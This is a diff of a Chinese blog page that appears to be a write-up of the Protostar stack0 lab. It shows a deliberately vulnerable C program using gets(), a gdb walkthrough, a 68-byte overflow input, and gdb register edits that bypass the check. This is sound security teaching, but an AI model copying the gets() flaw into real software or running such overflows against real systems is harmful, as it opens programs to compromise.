@@ -4,7 +4,6 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="baidu-site-verification" content="codeva-1wZQQJBzcr" />
     <meta name="keywords" content="Pwn-protostar靶场1 stack_zero, Linux，二进制，IoT，CTF">
     <meta name="description" content="protostar靶场day1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -19,17 +18,8 @@
 
 
     <title>Pwn-protostar靶场1 stack_zero | 8023</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.png">
     
-    <style>
-        body{
-            background-image: url(/medias/featureimages/17.jpg);
-            background-repeat:no-repeat;
-            background-size: 100% 100%;
-            background-attachment:fixed;
-        }
-    </style>
-
 
 
     <!-- bg-cover style     -->
@@ -62,9 +52,7 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
@@ -248,7 +236,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/Pr0b1em" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -305,7 +293,7 @@
     }
 </style>
 
-<a href="https://github.com/Pr0b1em" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -321,19 +309,6 @@
 </header>
 
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
-
 
 
 
@@ -366,12 +341,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
                             <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">笔记</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -411,7 +386,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    7 分
                 </div>
                 
 
@@ -425,64 +400,39 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 代码块功能依赖 -->
-        <script type="text/javascript" src="/libs/codeBlock/codeBlockFunction.js"></script>
-
-
-        <!-- 代码块复制 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-        
-
-        <!-- 代码块收缩 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-        
-
-        <!-- 代码块折行 -->
-        
-        <style type="text/css">
-        code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-        </style>
         
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <span id="more"></span>
-
-<h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1  stack_zero"></a>Pwn-protostar靶场1  stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
-<pre class="line-numbers language-none"><code class="language-none">https://exploit.education/protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1 stack_zero"></a>Pwn-protostar靶场1 stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;exploit.education&#x2F;protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>stack zero源码：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
+<span class="token punctuation">&#123;</span>
   <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
   modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have changed the 'modified' variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"> </p>
-<p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。 </p>
-<h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p> 我们使用gdb打开程序进行进一步的分析 </p>
-<pre class="line-numbers language-none"><code class="language-none">gdb /opt/protostar/bin/stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"></p>
+<p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。</p>
+<h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p>我们使用gdb打开程序进行进一步的分析</p>
+<pre class="line-numbers language-none"><code class="language-none">gdb &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731285612070.png"></p>
 <p>然后查看汇编代码，了解程序堆栈如何工作</p>
@@ -511,26 +461,26 @@ disassemble main  显示所有的汇编程序指令<span aria-hidden="true" clas
 0x08048434 &lt;main+64&gt;:   ret
 End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址 </p>
+<p>第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址</p>
 <p><img src="/img/1731285961101.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址 </p>
+<p>AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址</p>
 <pre class="line-numbers language-none"><code class="language-none">0x080483fa &lt;main+6&gt;:    sub    esp,0x60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 然后esp减去0x60</p>
+<p>然后esp减去0x60</p>
 <pre class="line-numbers language-none"><code class="language-none">0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 在内存移动的位置为0，在堆栈上的偏移为0x5c<br> 段地址+偏移地址=物理地址<br> <strong>举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址</strong> </p>
+<p>在内存移动的位置为0，在堆栈上的偏移为0x5c<br> 段地址+偏移地址&#x3D;物理地址<br> <strong>举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
 0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
 0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p> lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈<br> 然后DWORD PTR要取eax的地址到esp中<br> 调用gets函数 </p>
+<p>lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈<br> 然后DWORD PTR要取eax的地址到esp中<br> 调用gets函数</p>
 <pre class="line-numbers language-none"><code class="language-none">0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
 0x08048415 &lt;main+33&gt;:   test   eax,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p> 然后对比之前设置的值，0，用test来检查 </p>
+<p>然后对比之前设置的值，0，用test来检查</p>
 <p>接下来就是if的循环操作</p>
 <pre class="line-numbers language-none"><code class="language-none">0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
 0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
@@ -539,73 +489,73 @@ End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span><
 0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
 0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><h3 id="方法一：溢出"><a href="#方法一：溢出" class="headerlink" title="方法一：溢出"></a>方法一：溢出</h3><p>我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。 </p>
+<h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><h3 id="方法一：溢出"><a href="#方法一：溢出" class="headerlink" title="方法一：溢出"></a>方法一：溢出</h3><p>我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。</p>
 <pre class="line-numbers language-none"><code class="language-none">b *0x0804840c     #断点意思就是让程序执行到此“停住”，不再往下执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里 </p>
+<p>然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里</p>
 <pre class="line-numbers language-none"><code class="language-none">b *0x08048411<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731286435341.png"></p>
 <p>然后设置</p>
 <pre class="line-numbers language-none"><code class="language-none">define hook-stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令 </p>
-<pre class="line-numbers language-none"><code class="language-none">info registers   //显示寄存器里的地址
-x/24wx $esp      //显示esp寄存器里的内容
-x/2i $eip        //显示eip寄存器里的内容
-end              //结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令</p>
+<pre class="line-numbers language-none"><code class="language-none">info registers   &#x2F;&#x2F;显示寄存器里的地址
+x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
+x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
+end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 然后我们输入run运行程序到第一个断点 </p>
+<p>然后我们输入run运行程序到第一个断点</p>
 <p><img src="/img/1731286657496.png"></p>
 <p><img src="/img/1731286826301.png"></p>
-<p> 现在我们马上就要执行gets函数了，输入n执行gets函数（单步执行）</p>
-<p> 我们随意输入一些内容，按下回车键 </p>
+<p>现在我们马上就要执行gets函数了，输入n执行gets函数（单步执行）</p>
+<p>我们随意输入一些内容，按下回车键</p>
 <p><img src="/img/1731286911539.png"></p>
 <p><img src="/img/1731287011867.png"></p>
 <p>可以看到0x61是a的ascii码</p>
-<pre class="line-numbers language-none"><code class="language-none">x/wx $esp+0x5c            //查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c            &#x2F;&#x2F;查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287066725.png"></p>
-<p> 算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
+<p>算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'print "a"*(16*4+4)'</span> <span class="token operator">|</span> <span class="token operator">/</span>opt<span class="token operator">/</span>protostar<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | /opt/protostar/bin/stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287448288.png"></p>
-<p> 可以看到，我们已经成功打印出了正确的字符 </p>
+<p>可以看到，我们已经成功打印出了正确的字符</p>
 <h3 id="方式二：更改eip寄存器的值"><a href="#方式二：更改eip寄存器的值" class="headerlink" title="方式二：更改eip寄存器的值"></a>方式二：更改eip寄存器的值</h3><p>寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在<strong>64</strong>位程序里叫做<strong>RIP</strong>，<strong>他是程序的指针</strong>，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行<br>重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点</p>
 <pre class="line-numbers language-none"><code class="language-none">b main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 运行程序到断点处 </p>
-<p> 查看所有寄存器的值 </p>
+<p>运行程序到断点处</p>
+<p>查看所有寄存器的值</p>
 <pre class="line-numbers language-none"><code class="language-none">info registers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287668724.png"></p>
 <p><img src="/img/1731287789478.png"></p>
-<p> 我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd </p>
-<p> 查看程序汇编代码 </p>
+<p>我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd</p>
+<p>查看程序汇编代码</p>
 <p><img src="/img/1731287864176.png"></p>
 <p>如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the ‘modified’ variable也就是破解成功了<br>现在我们修改eip寄存器的值</p>
-<pre class="line-numbers language-none"><code class="language-none">set $eip=0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set $eip&#x3D;0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址 </p>
+<p>修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址</p>
 <p><img src="/img/1731287958947.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">n //执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">n &#x2F;&#x2F;执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287994713.png"></p>
 <p>破解成功</p>
-<h3 id="方式三：修改eax寄存器的值"><a href="#方式三：修改eax寄存器的值" class="headerlink" title="方式三：修改eax寄存器的值"></a>方式三：修改eax寄存器的值</h3><p> 最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the ‘modified’ variable </p>
-<p> 在对比的地方下一个断点 </p>
+<h3 id="方式三：修改eax寄存器的值"><a href="#方式三：修改eax寄存器的值" class="headerlink" title="方式三：修改eax寄存器的值"></a>方式三：修改eax寄存器的值</h3><p>最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the ‘modified’ variable</p>
+<p>在对比的地方下一个断点</p>
 <pre class="line-numbers language-none"><code class="language-none">b *0x08048415<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731288172489.png"></p>
-<p> 查看所有寄存器里的值 </p>
+<p>查看所有寄存器里的值</p>
 <p><img src="/img/1731288229480.png"></p>
-<p> 修改eax寄存器里的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">set $eax = 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>修改eax寄存器里的值</p>
+<pre class="line-numbers language-none"><code class="language-none">set $eax &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731288271210.png"></p>
-<p> 然后继续运行程序 </p>
+<p>然后继续运行程序</p>
 <p><img src="/img/1731288308240.png"></p>
 <p>破解成功！</p>
 
@@ -634,7 +584,7 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2024/111155bf.html">https://Pr0b1em.github.io/2024/111155bf.html</a>
+                    <a href="https://pr0b1em.github.io/2024/111155bf.html">https://pr0b1em.github.io/2024/111155bf.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -672,12 +622,12 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
                                 <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">笔记</span>
+                                </a>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
                                 </a>
                             
                         </div>
@@ -688,7 +638,7 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="qq,wechat" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -794,12 +744,12 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                     <a href="/tags/%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -870,50 +820,10 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
 </div>
 
 
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: 8023<br />'
-            + '文章作者: Pr0b1em<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者Pr0b1em所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
-
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -1037,7 +947,7 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">43.8k</span>
+                        class="white-color">44.7k</span>
             
             
             
@@ -1071,8 +981,8 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
                         var startYear = "2021";
                         var startMonth = "6";
                         var startDate = "17";
-                        var startHour = "17";
-                        var startMinute = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
                         var startSecond = "0";
                         var todayYear = today.getFullYear();
                         var todayMonth = today.getMonth() + 1;
@@ -1117,7 +1027,7 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
             
                 <span id="icp"><img src="/medias/icp.png"
                                     style="vertical-align: text-bottom;"/>
-                <a href="https://www.beian.gov.cn" target="_blank">渝ICP备2024047956号 | 渝公网安备50011702501074号</a>
+                <a href="https://beian.miit.gov.cn/" target="_blank">渝ICP备2024047956号-1</a> | <a href="https://www.beian.gov.cn" target="_blank">渝公网安备50011702501074号</a>
             </span>
             
         </div>
@@ -1372,8 +1282,14 @@ $(function () {
     
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
+
+
+    
+    <script src="/live2dw/lib/L2Dwidget.min.js"></script>
+    <script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script>
+    
     <script src="/js/FunnyTitle.js"></script>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</body>
 
 </html>
